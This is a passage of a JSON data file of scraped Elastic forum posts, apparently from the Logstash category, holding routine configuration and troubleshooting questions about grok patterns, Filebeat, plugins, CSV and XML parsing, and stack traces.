without 'settings' in the template file template_overwrite = true / false in the config file manage_template = true / false in the config file remove the fields which are not specified in the mapping (such as @version and @timestamp) but nothing seems to work. Also, I tried to 'create' the structure of the document in the filter part of the config file, but that is not the best solution, because I can have a lot of fields and a complex structure. And, there's no way to specify the type of the field to be nested (needed for querying later). What could be the problem?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "59013586-201f-4eaf-bc55-7cfc189d7c6f",
    "url": "https://discuss.elastic.co/t/logstash-to-logstash-communication-beat-hostname/227168",
    "title": "Logstash to logstash communication - beat.hostname",
    "category": [
      "Logstash"
    ],
    "author": "mtudisco",
    "date": "April 8, 2020, 3:34pm April 8, 2020, 4:06pm April 8, 2020, 4:25pm April 8, 2020, 5:46pm April 8, 2020, 8:09pm April 8, 2020, 10:44pm",
    "body": "Hi, I'm actually have a configuration with Filebeat sending logs to logstash, then logstash parsing information and sending it to differente pipelines, one of the to elasticsearch. In the parsing i use the field beat.hostname to identify the filebeat host from where the information comes. Because of network segmentation, now i need to add a second logstash on the other side of the firewall, and make some hosts with filebeat to send to this logstash, and the this logstash sends information to the central one that does the parsing. So Filebeat on host1 sends logs to logstash on host2, logstash on host2 sends information to logstash on host3. The question is when host3 receives the information, and its going to parse it, in beat.hostname i get host1 (the real origin of the data) or host2 (the intermediate host), the configuratio i plan to use is the one provided in documentation: Logstash on host2: input{ beats { port => 5044 ssl => true ssl_key => 'host2.pkcs8.key' ssl_certificate => 'hos2.crt' ssl_certificate_authorities => [\"ca.crt\"] ssl_verify_mode => \"force_peer\" } } output { lumberjack { codec => json hosts => \"host3\" ssl_certificate => \"host2.crt\" port => 5044 } } Logstash on host3: input { beats { codec => json port => 5044 ssl => true ssl_certificate => \"host3.cert\" ssl_key => \"host3.key\" ssl_certificate_authorities => [\"ca.crt\"] ssl_verify_mode => \"force_peer\" } } filter { #the original code } output { #the original output } thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "83e47b07-cd6f-4f50-a62e-793c15751f81",
    "url": "https://discuss.elastic.co/t/logstash-grok-pattern-question-when-sql-statement-has-commas-in-it/227022",
    "title": "Logstash grok pattern question when sql statement has commas in it",
    "category": [
      "Logstash"
    ],
    "author": "kyle_che",
    "date": "April 7, 2020, 10:50pm April 7, 2020, 10:53pm April 7, 2020, 10:56pm April 7, 2020, 10:57pm April 8, 2020, 8:55pm",
    "body": "I am trying to get a grok pattern to match the following and i have it besides the fact that i had to leave a field out to get it done. this is postgresql csv pattern and i needed to splice out the duration from the query. you can see that i did this by having a duration field and then the statement field ending with a double comma ,, anyone know how to not have to do a ,, and to be able to get the duration and query statement split out? between the ,, should be a field named \"detail\" which would be empty in this case. right now i just don't have a detail field but would like to have it. 2020-04-07 22:32:04.673 UTC,\"app_keystore\",\"keystore\",14220,\"[local]\",5e8cf4b2.378c,1748710,\"SELECT\",2020-04-07 21:46:26 UTC,5/0,0,LOG,00000,\"duration: 0.148 ms statement: SELECT \"\"keystore_app_keyconfig\"\".\"\"name\"\", \"\"keystore_app_keyconfig\"\".\"\"usage\"\", \"\"keystore_app_keyconfig\"\".\"\"lifetime\"\", \"\"keystore_app_keyconfig\"\".\"\"band_id\"\", \"\"keystore_app_keyconfig\"\".\"\"rotation_method\"\", \"\"keystore_app_keyconfig\"\".\"\"seg_size\"\", \"\"keystore_app_keyconfig\"\".\"\"rotation_time\"\", \"\"keystore_app_keyconfig\"\".\"\"pre_create_keys\"\", \"\"keystore_app_keyconfig\"\".\"\"notes\"\" FROM \"\"keystore_app_keyconfig\"\" WHERE \"\"keystore_app_keyconfig\"\".\"\"name\"\" = 'qa_unit_tests'\",,,,,,,,,\"app - 10.124.193.84:33116\" (%{TIMESTAMP_ISO8601:timestamp}%{SPACE}%{TZ:time_zone})?,(%{DATA:user_name})?,(%{DATA:database_name})?,(%{NUMBER:process_id})?,(\"\\[%{DATA:connection_from}\\]\")?,(%{USERNAME:session_id})?,(%{NUMBER:session_line_num})?,(\"%{DATA:command_tag}\")?,(%{TIMESTAMP_ISO8601:timestamp2}%{SPACE}%{TZ:time_zone2})?,(%{DATA:virtual_transaction_id})?,(%{DATA:transaction_id})?,(%{DATA:error_severity})?,(%{NUMBER:sql_state_code})?,\"duration:%{SPACE}%{NUMBER:duration}%{SPACE}ms%{SPACE}statement:%{SPACE}%{DATA:statement}\",,(%{DATA:hint})?,(%{DATA:internal_query})?,(%{DATA:internal_query_pos})?,(%{DATA:context})?,(%{DATA:query})?,(%{DATA:query_pos})?,(%{DATA:location})?,(%{GREEDYDATA:application_name})?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "05a633f8-467c-4f73-a0f1-b997b7807a67",
    "url": "https://discuss.elastic.co/t/filling-value-into-placeholder-in-a-field/226126",
    "title": "Filling value into placeholder in a field",
    "category": [
      "Logstash"
    ],
    "author": "Saurabh_Singh1",
    "date": "April 1, 2020, 9:17pm April 1, 2020, 10:57pm April 2, 2020, 4:52am April 2, 2020, 3:01pm April 8, 2020, 7:51pm",
    "body": "Hi , I have a field named 'message'. This field contains data like, message : 'My IP is {%source_ip}.This {%source.ip} is external ip.' I want to replace all the instance of this placeholder {%source_ip} , with a value. Can anybody help me how to do this.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ffdd181c-0b64-46b0-bdd2-1e5fbc831efc",
    "url": "https://discuss.elastic.co/t/capture-message/227164",
    "title": "Capture Message",
    "category": [
      "Logstash"
    ],
    "author": "manikandanb87",
    "date": "April 8, 2020, 3:28pm April 8, 2020, 5:24pm April 8, 2020, 5:25pm",
    "body": "Hi Team, I am testing my log stash output and found that it is stashing as below. But, I would like to know how can I match and capture only the entries in the log - \"Sign on javacode failed for user USERA\" Kindly help. \"oprid\" => \"-\", \"@timestamp\" => 2020-04-08T15:17:06.944Z, \"log_message\" => \"Sign on javacode failed for user USERA@xxx.xxx.xx.xx..\", \"TOPInstanceID\" => \"1610670968891559937\", \"path\" => \"/searchtech/logstash-7.6.1/bin/failelogin.log\", \"app_timestamp\" => \"2020-03-31T11:56:24.569\", \"host\" => \"nonelastic\", \"serequest\" => \"437\", \"timestamp\" => 2020-03-31T11:56:24.569Z, \"@version\" => \"1\", \"process\" => \"JVM\", \"prcsid\" => \"128077\", \"service\" => \"login\", \"log_level\" => \"3\", \"SRID\" => \"c9qnpn/QLB2UyA\" } { \"oprid\" => \"-\", \"@timestamp\" => 2020-04-08T15:17:06.944Z, \"log_message\" => \"(502): USERA@xxx.xxx.xx.xx is an Invalid User ID, or you typed the wrong password. Make sure you're typing in the correct upper and lower case.\", \"TOPInstanceID\" => \"1610670968891559937\", \"path\" => \"/searchtech/logstash-7.6.1/bin/failelogin.log\", \"app_timestamp\" => \"2020-03-31T11:56:24.569\", \"host\" => \"nonelastic\", \"serequest\" => \"437\", \"timestamp\" => 2020-03-31T11:56:24.569Z, \"@version\" => \"1\", \"process\" => \"JVM\", \"prcsid\" => \"128077\", \"service\" => \"login\", \"log_level\" => \"1\", \"SRID\" => \"c9qnpn/QLB2UyA\" }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3ce5bf8c-d7e1-4da4-bde4-263609af42f9",
    "url": "https://discuss.elastic.co/t/nmap-plugin-module-still-working/226479",
    "title": "Nmap plugin/module? still working",
    "category": [
      "Logstash"
    ],
    "author": "stcdarrell",
    "date": "April 3, 2020, 10:00pm April 4, 2020, 12:43am April 4, 2020, 2:42am April 5, 2020, 6:13pm April 5, 2020, 7:02pm April 6, 2020, 3:28pm April 6, 2020, 8:40pm April 7, 2020, 8:17am April 7, 2020, 3:08pm April 8, 2020, 2:38pm April 8, 2020, 3:22pm",
    "body": "anyone had any luck getting the nmap scan xml codec/plugin to work with v7? i've got it reading the data in with the plugin, but the template wont import.. and the data is pretty rough around the edges. any suggestions would be appreciated",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "52cae9cd-f36f-440a-8277-141d9819b088",
    "url": "https://discuss.elastic.co/t/error-installing-the-plugin/226989",
    "title": "Error Installing the Plugin",
    "category": [
      "Logstash"
    ],
    "author": "hlogan",
    "date": "April 7, 2020, 6:46pm April 7, 2020, 8:06pm April 7, 2020, 8:32pm April 7, 2020, 11:57pm April 8, 2020, 2:58pm",
    "body": "Hi , I am getting error while installing the plugin #bin/logstash-plugin install logstash-input-salesforce Validating logstash-input-salesforce Installing logstash-input-salesforce Plugin version conflict, aborting ERROR: Installation Aborted, message: Bundler could not find compatible versions for gem \"faraday\": In snapshot (Gemfile.lock): faraday (= 0.15.4) In Gemfile: logstash-input-elasticsearch java was resolved to 4.6.0, which depends on faraday (~> 0.15.4) java logstash-input-salesforce java was resolved to 3.0.5, which depends on restforce (~> 2.4.2) java was resolved to 2.4.2, which depends on faraday (~> 0.9.0) java Running bundle update will rebuild your snapshot from scratch, using only the gems in your Gemfile, which may resolve the conflict. Bundler could not find compatible versions for gem \"logstash-core\": In snapshot (Gemfile.lock): logstash-core (= 7.6.1) In Gemfile: logstash-core java logstash-core-plugin-api java was resolved to 2.1.16, which depends on logstash-core (= 7.6.1) java logstash-input-syslog java was resolved to 3.4.1, which depends on logstash-filter-grok java was resolved to 4.3.0, which depends on logstash-core (>= 5.6.0) java logstash-input-salesforce java was resolved to 0.1.1, which depends on logstash-core (>= 1.4.0, < 2.0.0) java logstash-integration-jdbc java was resolved to 5.0.1, which depends on logstash-core (>= 6.5.0) java Running bundle update will rebuild your snapshot from scratch, using only the gems in your Gemfile, which may resolve the conflict. Bundler could not find compatible versions for gem \"logstash-core-plugin-api\": In snapshot (Gemfile.lock): logstash-core-plugin-api (= 2.1.16) In Gemfile: logstash-devutils (~> 1) java was resolved to 1.3.6, which depends on logstash-core-plugin-api (>= 2.0, <= 2.99) java logstash-input-salesforce java was resolved to 2.0.4, which depends on logstash-core-plugin-api (~> 1.0) java Running bundle update will rebuild your snapshot from scratch, using only the gems in your Gemfile, which may resolve the conflict. Please help Thanks, Hlogan",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "cdd3e55d-23c6-4849-bb11-2405fa8699f8",
    "url": "https://discuss.elastic.co/t/stuck-at-successfully-started-logstasg-api-endpoint/227155",
    "title": "Stuck at Successfully started Logstasg API endpoint",
    "category": [
      "Logstash"
    ],
    "author": "Robert_Ga",
    "date": "April 8, 2020, 2:38pm",
    "body": "Hello everyone, I just installed Logstash 7.6 on ubuntu 18. My end goal is to add some json files to an elasticsearch instance. Unfortunately, when I run \"logstash -f cfile.conf\", I get stuck at phrase : Stuck at Successfully started Logstasg API endpoint I wanted to try the easiest example, so my cfile.conf is looking something like this : input { stdin { } } output { stdout {} } But still the same issue. If I try to run like this: logstash - e 'input { stdin { } } output { stdout {} }', is working. Has anyone any ideea about this issue? Thank you!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "9e522fe8-0951-4819-9bfe-329ea6b56651",
    "url": "https://discuss.elastic.co/t/extracting-field-from-events-in-logstash/227102",
    "title": "Extracting field from Events in LOGSTASH",
    "category": [
      "Logstash"
    ],
    "author": "nb03briceno",
    "date": "April 8, 2020, 10:50am April 8, 2020, 2:17pm",
    "body": "Hello everyone, I come to the forum to ask if somebody could give a suggestion. I'm trying to take a field from a log event but I'm not having the results that I want. The field is for the words in bold; The log looks like this: 2020-03-26 06:11:44,936 INFO IMCEventQueue imc-ice-fixos: IN << 8=FIX.4.2|9=1015|35=UDS|49=ICE|34=1158|52=20200326-05:11:44.796707|56=13953|57=HORIZON|322=6|320=1585199499433|323=4|9052=200|55=5793804|48=L FMM0022-L FMM0024|22=8|207=IFLL|9048=L 99 5793804|167=MLEG|541=20220615|107=Three Month Sterling Future Spr - ICEU - Jun22/Jun24|326=18|762=99|996=point|9064=2|60=20180620-12:53:01.737|9013=0.005|9014=1.0|9083=3.0|9084=0|9061=6423|9030=1|9091=IFLL.L|9092=1|9002=F|9040=0.005|9041=1.0|9100=GBP|9101=GBP / point|9185=3.0|9022=1|9024=1.0|9205=1|9215=1|9300=9824|9301=ICEU|9302=ICEU|9303=L|9200=17|9202=Jun22/Jun24|9062=Three Month Sterling Future Spr|9217=0|9070=12|9071=0|9072=K|9073=1000.0|9071=1|9072=K|9073=1.0|9071=2|9072=K|9073=6000.0|9071=3|9072=K|9073=17.0|9071=0|9072=4|9073=3000.0|9071=1|9072=4|9073=1.0|9071=2|9072=4|9073=1.0|9071=3|9072=4|9073=17.0|9071=0|9072=AA|90 2020-03-26 05:10:06,703 INFO Timer-ll-Indicators-6 IndicatorSet-IBus-Server: IBus-Server: root[LocalPort=-1] clients[NbTCP=0 MaxTCP=300 NbLocal=4] Memory[Consumed=251MB Free=473MB Max=911MB Total=724MB] CPU[Current=0.01% Average=0.02% Cores=0.00 Max=0.57% AvailableProcessors=28] 2020-03-25 07:00:21,642 INFO IMC-DICT_QUEUE DictUpdates: Publishing dictionary event: DictEvent[100814987 INSERTED] ...... Would you mind giving me a suggestion? I'm trying with this pattern in grok: %{TIMESTAMP_ISO8601:logdate} %{LOGLEVEL:logLevel} %{GREEDYDATA:thread_name} %{SPACE} %{WORD:class_name}:%{GREEDYDATA:text} but it only works good for the \"type3\" raw in the event. Thanks so much,",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a598ea5b-002c-4832-a1a1-fa78a46d64e0",
    "url": "https://discuss.elastic.co/t/exception-on-logstash-when-closing-filebeat/227142",
    "title": "Exception on logstash when closing filebeat",
    "category": [
      "Logstash"
    ],
    "author": "billymerendina",
    "date": "April 8, 2020, 1:56pm",
    "body": "Hi everybody, I'm working with Elasticsearh, kibana, filebeat and logstash 7.6.2 on windows pc. Everythings seems to be right. But I see somethng strange when i kill (ctrl + c) the filebeat process (I don 't use it as service). When I kill the filebeat process, logstash notifies this exception: [2020-04-08T04:50:04,395][INFO ][org.logstash.beats.BeatsHandler][main] [local: 0.0.0.0:5044, remote: 10.1.1.1:49628] Handling exception: An existing connection was forcibly closed by the remote host [2020-04-08T04:50:04,395][WARN ][io.netty.channel.DefaultChannelPipeline][main] An exceptionCaught() event was fired, and it reached at the tail of the pipeline. It usually means the last handler in the pipeline did not handle the exception. java.io.IOException: An existing connection was forcibly closed by the remote host at sun.nio.ch.SocketDispatcher.read0(Native Method) ~[?:?] at sun.nio.ch.SocketDispatcher.read(SocketDispatcher.java:43) ~[?:?] at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:276) ~[?:?] at sun.nio.ch.IOUtil.read(IOUtil.java:233) ~[?:?] at sun.nio.ch.IOUtil.read(IOUtil.java:223) ~[?:?] at sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:358) ~[?:?] at io.netty.buffer.PooledUnsafeDirectByteBuf.setBytes(PooledUnsafeDirectByteBuf.java:288) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.buffer.AbstractByteBuf.writeBytes(AbstractByteBuf.java:1128) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.channel.socket.nio.NioSocketChannel.doReadBytes(NioSocketChannel.java:347) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:148) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:644) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:579) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:496) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:458) [netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:897) [netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) [netty-all-4.1.30.Final.jar:4.1.30.Final] at java.lang.Thread.run(Thread.java:834) [?:?] Is there a way to close filebeat process gracefully? I'm my filebeat.yml I have this properties: ignore_older: 10m close_inactive: 5m But it does not resolve my problem. Thank you in advance, Regards. Alessandro",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4ff0d45c-e0cd-4cb1-93c2-9167d51c3f57",
    "url": "https://discuss.elastic.co/t/logstash-csv-parse-error/227138",
    "title": "Logstash CSV Parse Error",
    "category": [
      "Logstash"
    ],
    "author": "MoeAly",
    "date": "April 8, 2020, 1:37pm",
    "body": "Hello ES community! I hope you are all doing well and staying safe. I'm running into a small issue while parsing/importing CSV data via logstash to ES. Specifically, the issue is with one of my CSV fields. The field contains multiple phone numbers and names in one cell see example below. Logstash is not able to read/process the full cell for this field properly. It only picks up the first number/name in the cell and leaves out all the rest. +15557428638 +15556749826 John Doe John Schmoe +15556130986 It's also worth noting that when I remove this field all together, my script works perfect and the remaining data/fields are transferred to ES with no issues. Below is the script I'm currently using. The trouble field is called \"Participants\". Any suggestions or help is greatly appreciated. What data value should \"Participants\" be mapped to? input { stdin{} file { path => \"C:/Users/Moe/Desktop/demo/message_analysis/messagedatademo.csv\" start_position => \"beginning\" sincedb_path => \"NUL\" } } filter { csv { separator => \",\" columns => [\"Participants\",\"Source\",\"Deleted\",\"From\",\"Body\",\"Status\",\"Date\"] } date { match => [ \"Date\" , \"MM/dd/yyyy HH:mm\" ] } } filter { mutate { convert => { \"Body\" => \"string\" } convert => { \"Participants\" => \"string\" } } } output { elasticsearch { hosts => \"localhost:9200\" index => \"chatdataload\" } stdout {} }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b881699a-0392-4fdb-b787-9072f1485ca0",
    "url": "https://discuss.elastic.co/t/logstash-xml-filter-output/227099",
    "title": "Logstash XML Filter Output",
    "category": [
      "Logstash"
    ],
    "author": "ksremo",
    "date": "April 8, 2020, 10:43am April 9, 2020, 9:14am",
    "body": "Hello, i have a xml encoded logfile which is transferd with filebeat to logstash. in the logstash pipeline i use the xml-filter. the output looks like: Event.Client-IP-Address { \"content\": \"10.x.x.x\", \"data_type\": \"3\" } Input line looks like: <Event><Client-IP-Address data_type=3>\"10.x.x.x<Client-IP-Address/><Event/> And Filter: filter { xml { source => \"message\" target => \"Event\" } } But i want to fill the Field Event.Client-IP-Address with just the xml content field and ignore data_type. How can i do this?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9d11205a-b5de-44b7-8d41-51853c30bf6e",
    "url": "https://discuss.elastic.co/t/split-a-json-array-with-same-fields-names/226996",
    "title": "Split a json array with same fields names",
    "category": [
      "Logstash"
    ],
    "author": "lloronavirus",
    "date": "April 9, 2020, 5:44am",
    "body": "This post was flagged by the community and is temporarily hidden.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d2e44634-3d19-4d4d-876e-1f8e982008a5",
    "url": "https://discuss.elastic.co/t/not-able-to-get-all-lines-in-kibana/227071",
    "title": "Not able to get all lines in Kibana",
    "category": [
      "Logstash"
    ],
    "author": "issiway",
    "date": "April 8, 2020, 7:41am",
    "body": "I am having a problem wherein i do not get all the lines in Kibana via filebeat. I basically do not get the line- \"Script has been completed\" It prints all other lines except the completed one. My filebeat.yml- filebeat.inputs: fields: apache: true paths: - /opt/pega/log/* processors: - add_fields: fields: pega-app: \"${BATCH_NAME}\" type: log logging.files: keepfiles: 3 name: filebeat.out path: /opt/pega/log/ rotateeverybytes: 1048576 logging.metrics.enabled: false logging.to_files: true logging.to_syslog: false output.logstash: hosts: - \"${PEGA_LOGSTASH_URL}\" path.config: /etc/filebeat path.data: /var/filebeat path.home: /bin/filebeat path.logs: /opt/pega/log/filebeat Script (only the status return)- function writeToLog { message={1} rcode={2} ldate=(date +%m-%d-%Y) ltime=(date +%R) logrecord=\"${ldate} ${ltime} ${message}\" echo ${logrecord} >> ${loglocation} } batchstatus=(fgrep -i \"status: \" <<< \"{result}\" | awk '{print $2}') # Check if batch successful. if [[ ${batchstatus} == *0* ]]; then writeToLog \"${BATCH_TYPE} batch successfully completed.\" sleep 5 exit 0 fi # Check if batch has failed. if [[ ${batchstatus} == *4* ]] || [[ ${batchstatus} == *1* ]] || [[ ${batchstatus} == *-1* ]]; then # Batch has failed. writeToLog \"${BATCH_TYPE} batch has failed.\" exit 1 fi # Check if batch is pending. if [[ ${batchstatus} == *5* ]]; then # Batch is pending. writeToLog \"${BATCH_TYPE} batch is pending.\" fi I have tried adding a lot of sleep as well but it doesn't help. Please help me image769×442 8.01 KB",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "995c6856-1b4a-4648-b004-dad79129655a",
    "url": "https://discuss.elastic.co/t/ecs-version-field-as-array-or-clean-up/226407",
    "title": "Ecs.version field as array or clean up?",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 3, 2020, 1:24pm April 3, 2020, 2:13pm April 8, 2020, 7:12am April 3, 2020, 3:22pm April 8, 2020, 7:12am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2f43b289-2914-4129-9160-399b26e08315",
    "url": "https://discuss.elastic.co/t/logstash-filter-for-displaying-top-exception-names-occurred-in-spring-boot-application/226935",
    "title": "Logstash filter for displaying top exception names occurred in spring boot application",
    "category": [
      "Logstash"
    ],
    "author": "Mohammed_Siddiq",
    "date": "April 7, 2020, 3:22pm April 7, 2020, 3:38pm April 8, 2020, 6:01am",
    "body": "Hi Magnus, I have recently started using ELK, I have been assigned to do ELK integration in my project. I have installed 7.6.1 of ELK and filebeat. I need your assistance is configuring filter for logstash to achieve task mentioned below What I have done until now --- I have created a sample microservice which will create some dummy logs and exception when specific REST endpoint url is hit microservices is configured with logback xml where they will dump all the logs in specific logback folder 3 filebeat will pickup all the logs and send it to logstash logstash will forward the same logs to elastic search and can be viewed in Kibana What I want to achieve --- I want to visualize top- N exception names coming from the logs with respect to count ( I have attached the screenshot of kibana visualization for the same) Top -N URIPATHS to be visualized in kibana wrt count I wanted to see the whole stack trace as a single unit please help.... my sample log file is as below -- 2020-04-07 20:20:33.679 ERROR 41436 --- [ restartedMain] o.s.boot.SpringApplication : Application run failed java.lang.IllegalStateException: Error processing condition on org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration.propertySourcesPlaceholderConfigurer at org.springframework.boot.autoconfigure.condition.SpringBootCondition.matches(SpringBootCondition.java:60) ~[spring-boot-autoconfigure-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.context.annotation.ConditionEvaluator.shouldSkip(ConditionEvaluator.java:108) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitionsForBeanMethod(ConfigurationClassBeanDefinitionReader.java:184) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitionsForConfigurationClass(ConfigurationClassBeanDefinitionReader.java:144) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitions(ConfigurationClassBeanDefinitionReader.java:120) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.annotation.ConfigurationClassPostProcessor.processConfigBeanDefinitions(ConfigurationClassPostProcessor.java:331) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.annotation.ConfigurationClassPostProcessor.postProcessBeanDefinitionRegistry(ConfigurationClassPostProcessor.java:236) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanDefinitionRegistryPostProcessors(PostProcessorRegistrationDelegate.java:275) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(PostProcessorRegistrationDelegate.java:95) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:706) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:532) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) ~[spring-boot-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) [spring-boot-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) [spring-boot-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) [spring-boot-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) [spring-boot-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) [spring-boot-2.2.5.RELEASE.jar:2.2.5.RELEASE] at com.ibm.product.ProductsApplication.main(ProductsApplication.java:11) [classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_241] at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[na:1.8.0_241] at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[na:1.8.0_241] at java.lang.reflect.Method.invoke(Unknown Source) ~[na:1.8.0_241] at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:49) [spring-boot-devtools-2.2.5.RELEASE.jar:2.2.5.RELEASE] Caused by: java.lang.IllegalStateException: Failed to introspect Class [com.ibm.product.service.KafkaConfig] from ClassLoader [org.springframework.boot.devtools.restart.classloader.RestartClassLoader@6c43b25f] at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:481) ~[spring-core-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.util.ReflectionUtils.doWithMethods(ReflectionUtils.java:358) ~[spring-core-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.util.ReflectionUtils.getUniqueDeclaredMethods(ReflectionUtils.java:414) ~[spring-core-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.lambda$getTypeForFactoryMethod$2(AbstractAutowireCapableBeanFactory.java:743) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE] at java.util.concurrent.ConcurrentHashMap.computeIfAbsent(Unknown Source) ~[na:1.8.0_241] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryMethod(AbstractAutowireCapableBeanFactory.java:742) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.determineTargetType(AbstractAutowireCapableBeanFactory.java:681) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.predictBeanType(AbstractAutowireCapableBeanFactory.java:649) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.isFactoryBean(AbstractBeanFactory.java:1605) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:520) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:491) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.boot.autoconfigure.condition.OnBeanCondition.collectBeanNamesForType(OnBeanCondition.java:230) ~[spring-boot-autoconfigure-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.autoconfigure.condition.OnBeanCondition.getBeanNamesForType(OnBeanCondition.java:223) ~[spring-boot-autoconfigure-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.autoconfigure.condition.OnBeanCondition.getBeanNamesForType(OnBeanCondition.java:213) ~[spring-boot-autoconfigure-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.autoconfigure.condition.OnBeanCondition.getMatchingBeans(OnBeanCondition.java:167) ~[spring-boot-autoconfigure-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.autoconfigure.condition.OnBeanCondition.getMatchOutcome(OnBeanCondition.java:142) ~[spring-boot-autoconfigure-2.2.5.RELEASE.jar:2.2.5.RELEASE] at org.springframework.boot.autoconfigure.condition.SpringBootCondition.matches(SpringBootCondition.java:47) ~[spring-boot-autoconfigure-2.2.5.RELEASE.jar:2.2.5.RELEASE] ... 22 common frames omitted Caused by: java.lang.NoClassDefFoundError: ProducerFactory at java.lang.Class.getDeclaredMethods0(Native Method) ~[na:1.8.0_241] at java.lang.Class.privateGetDeclaredMethods(Unknown Source) ~[na:1.8.0_241] at java.lang.Class.getDeclaredMethods(Unknown Source) ~[na:1.8.0_241] at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:463) ~[spring-core-5.2.4.RELEASE.jar:5.2.4.RELEASE] ... 38 common frames omitted Caused by: java.lang.ClassNotFoundException: ProducerFactory at java.net.URLClassLoader.findClass(Unknown Source) ~[na:1.8.0_241] at java.lang.ClassLoader.loadClass(Unknown Source) ~[na:1.8.0_241] at 